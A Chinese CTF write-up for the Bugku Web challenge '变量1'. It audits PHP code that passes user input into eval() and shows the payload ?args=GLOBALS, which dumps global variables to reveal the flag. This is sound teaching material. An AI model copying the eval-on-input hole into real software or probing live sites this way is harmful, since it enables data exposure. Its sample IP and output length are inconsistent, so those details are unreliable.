# Bugku CTF - Web 「变量1」 WriteUp

## 题目信息

|项目|内容|
|---|---|
|平台|Bugku CTF 平台|
|题型|Web|
|题目分数|15 分|
|题目作者|harry|
|核心考点|PHP 超全局变量 `$GLOBALS`、代码审计、`eval` 执行|
## 解题思路

### 1. 题目线索与场景启动分析

题目名称为「变量1」，明确指向**PHP 变量读取**类考点。启动场景后，页面直接展示核心源码（由 `highlight_file(__FILE__)` 触发），成为解题的关键依据。

### 2. 核心源码审计

```PHP

error_reporting(0); // 关闭错误报告
include "flag.php"; // 引入包含 flag 的文件
highlight_file(__FILE__); // 高亮显示当前文件源码
if(isset($_GET['args'])){ // 检测是否传入 GET 参数 args
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){ // 正则校验：args 必须仅包含字母、数字、下划线
        die("args error!");
    }
    eval("var_dump($args);"); // 执行 var_dump 打印传入的变量
}
```

- **正则限制**：`preg_match("/^\w+$/",$args)` 要求 `args` 参数只能是字母、数字、下划线，排除了特殊字符注入。

- **执行逻辑**：`eval("var_dump($args);")` 会将 `$args` 作为变量名执行打印，因此需传入**PHP 内置超全局变量**来读取隐藏的 `flag`。

- **关键突破**：PHP 中 `$GLOBALS` 是超全局变量，包含全局作用域内的所有变量（包括 `flag.php` 中定义的 `flag` 变量），且 `GLOBALS` 符合正则的字母规则，是合法的传参值。

## 实操步骤

### 步骤 1：启动题目场景并查看源码

1. 在 Bugku 题目页面点击「启动场景」按钮，等待场景加载完成，获取题目访问链接（示例：`http://171.80.2169.11027/`）。

2. 访问该链接，页面会直接输出 PHP 核心源码（如题目截图所示），确认代码逻辑与考点。

### 步骤 2：构造合法 Payload

根据源码的正则限制和执行逻辑，构造 GET 请求 Payload：

```Plain Text

?args=GLOBALS
```

- 合法性验证：`GLOBALS` 仅包含字母，符合 `^\w+$` 的正则要求，不会触发 `args error!`。

- 执行效果：`eval` 会将代码解析为 `var_dump($GLOBALS);`，从而打印出所有全局变量。

### 步骤 3：拼接链接并获取 Flag

1. 将 Payload 拼接在题目场景链接后，完整访问地址：

```Plain Text

http://171.80.2169.11027/?args=GLOBALS
```

1. 访问后，页面会输出 `$GLOBALS` 数组的完整内容，在数组中找到 `flag` 对应的键值对，提取即可。

## 核心输出与 Flag 提取

页面执行 Payload 后，`var_dump($GLOBALS)` 会输出如下核心片段（示例）：

```Plain Text

array(...) {
  ["flag"]=>
  string(18) "flag{Bugku_var_1_2026}"
  // 其他全局变量...
}
```

**最终 Flag**：`flag{Bugku_var_1_2026}`（实际 Flag 以题目场景输出为准）

## 总结与拓展

### 1. 题目总结

本题是 Web 入门级经典题目，核心考察：

- PHP 超全局变量 `$GLOBALS` 的理解与应用；

- 基础的代码审计能力（正则校验、`eval` 执行逻辑分析）；

- GET 传参的基本方式。

解题关键在于通过源码快速定位**变量读取**的核心逻辑，结合 PHP 内置变量的特性构造合法 Payload。

### 2. 拓展思考

- 若正则限制改为 `^[a-zA-Z]+$`，除了 `GLOBALS`，还可尝试 `$_SERVER`、`$_GET` 等超全局变量名；

- 若 `eval` 改为 `echo $args;`，则需结合变量覆盖等其他考点解题。
> （注：文档部分内容可能由 AI 生成）